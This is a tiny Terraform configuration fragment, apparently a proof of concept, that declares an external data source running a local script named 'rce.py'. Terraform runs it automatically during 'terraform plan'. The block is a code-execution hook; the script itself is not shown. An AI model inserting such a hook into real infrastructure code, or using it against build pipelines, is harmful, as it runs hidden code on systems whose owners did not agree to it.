data "external" "external_provider" {
    program = ["python3", "rce.py"]
}
